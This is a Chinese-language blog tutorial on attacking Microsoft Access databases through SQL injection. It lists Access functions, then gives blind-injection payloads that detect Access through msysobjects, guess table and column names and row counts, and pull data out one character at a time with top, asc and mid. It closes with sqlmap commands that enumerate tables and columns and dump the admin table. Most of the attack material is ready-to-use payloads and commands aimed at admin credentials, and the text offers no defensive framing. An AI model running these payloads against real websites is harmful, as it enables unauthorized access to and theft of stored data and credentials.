**目录**

[Access数据库](#t0)

[Access数据库中的函数](#t1) 

[盲注Access数据库](#t2) 

[Sqlmap注入Access数据库](#t3)

* * *

Access数据库
---------

**Microsoft Office Access**是由微软发布的[关系数据库](https://so.csdn.net/so/search?q=%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020)管理系统。Microsoft Office Access是微软把数据库引擎的图形用户界面和软件开发工具结合在一起的一个数据库管理系统。它是微软Office家族的一个成员。Access以它自己的格式将数据存储在基于Access Jet的数据库引擎里。Access数据库属于文件型数据库，所以不需要端口号。

在Office 2007之前的Access数据库文件的后缀是 **.mdb** ，Office2007及其之后的Access数据库文件的后缀是 **.accdb** 。

Access数据库中没有注释符号.因此  /\*\*/   、 --   和   #   都没法使用。

Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。

Access数据库不支持错误显示注入，Access数据库不能执行系统命令。

数据库文件打开工具：**辅臣数据库浏览器**

Access数据库的连接

```
"Driver={Microsoft Access driver(*.mdb)};dbq=*;uid=admin;pwd=pass;"
```


### Access数据库中的函数 

```
select len("string")        查询给定字符串的长度      
select asc("a")             查询给定字符串的ascii值      
top  n                      查询前n条记录      
select mid("string",2,1)    查询给定字符串从指定索引开始的长度
```


mid(string,start,length) 这个用来截取字符串的

*       string是要截取的字符串
*       start是截取的字符串开始索引
*       length是要截取的字符串长度 

### 盲注Access数据库 

Access数据库特有的表是：**msysobjects**  ，所以可以用它来判断是否是Access数据库

```
exists(select*from msysobjects)  #如果这条语句正确，说明是Access数据库
```


Access没有数据库的概念，所有的表都是在同一个数据库下。所以，我们不用去判断当前的数据库名，并且access数据库中也不存在 database() 函数。

对于判断存在哪些表，只能用以下**枚举**的方法来猜测是否存在某某表。 

```
判断存在sql注入后，判断是否存在admin表，如果存在，正常查询，如果不存在，报语法错误。然后通过枚举表名爆破      
and exists(select* from  admin)
```


猜测字段也是一样，只能通过枚举来猜测 

```
判断有admin表后，再判断admin表有多少列，假如1-10正常查询，11列报语法报错，那说明有10列      
and exists(select*from admin order by 10)      
判断出存在的列数后，再判断具体的列名。以下语句判断是否存在name列，如果存在，正常查询，如果不存在，则报语法错误。然后再通过枚举列名爆破      
and exists(select name from admin)
```


猜测完表名和字段名后，我们就看看这个表里面有多少行数据 ，如果>99查询正确，>100查询错误(这里是查询错误，而不是语法错误)，说明有100行数据

```
and (select count(*) from information)>100
```


然后在猜测每个字段具体的数据了 

access数据库中没有 limit，就不能限制查询出来的行数。但是我们可以使用top命令，top 1是将查询的所有数据只显示第一行，所以 top3就是显示查询出来的前三行数据了

```
猜测admin列的第一个数据的长度，如果大于5查询不出数据，大于4正常，说明admin列的第一个数据长度是5      
and (select top 1 len(admin)from admin)>5       
猜测admin列的第一行数据的第一个字符的ascii码值，如果大于97查询不出数据，大于96正常，说明admin列的第一行数据的第一个字符的ascii值是97      
and (select top 1 asc(mid(admin,1,1))from admin)>97       
第一行数据的第二个字符      
and (select top 1 asc(mid(admin,2,1))from admin)>97        
从第二行开始，查询数据就得用另外的语句了,因为这里的top只能显示查询前几条数据，所以我们得用联合查询，先查询前两条，然后倒序，然后在找出第一条，这就是第二条数据。      1
查询第二行admin列的长度      1
and (select top 1 len(admin)  from ( select top 2 * from information order by id)  order by id desc)>55      1
下面是查询第2条数据的第3个字符      1
and (select top 1 asc(mid(admin,3,1))  from ( select top 2 * from information order by id)  order by id desc)>55      1
查询第三条数据的4个字符      1
and (select top 1 asc(mid(admin,4,1))  from ( select top 3 * from information order by id)  order by id desc)>55
```


注：在access中，中文也可以用asc函数来表示，例如：asc(mid("中国",1)) 表示 中 字的ascii值，可以用 chr 来逆向得出值

```
asc("中") = -10544      
chr(-10544) = 中
```


### Sqlmap注入Access数据库

**爆出access数据库存在的表**，只能利用枚举的方式爆破。

```
sqlmap -u "xxx"  --tables
```


第一步问我们是否使用公共的库去爆破，我们选择：Y；

第二步选择默认的库文件：1 

第三步选择线程数：10

![](https://img-blog.csdnimg.cn/20190307153027569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

可以看出爆出了两个数据表：admin 、 specialty

**爆出admin数据库中的列名**

```
sqlmap -u "xxx" -T admin --columns
```


意思和上一步也是一样的。 

![](https://img-blog.csdnimg.cn/2019030715315053.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**爆出admin表下username列的所有数据**

```
sqlmap -u "xxx" -T admin -C username --dump-all
```


相关文章：[整理比较全的Access SQL注入参考](https://www.jb51.net/article/14600.htm)

                  [Sqlmap使用详解](https://blog.csdn.net/qq_36119192/article/details/84479207)

                  [SQL注入漏洞详解](https://blog.csdn.net/qq_36119192/article/details/81987834)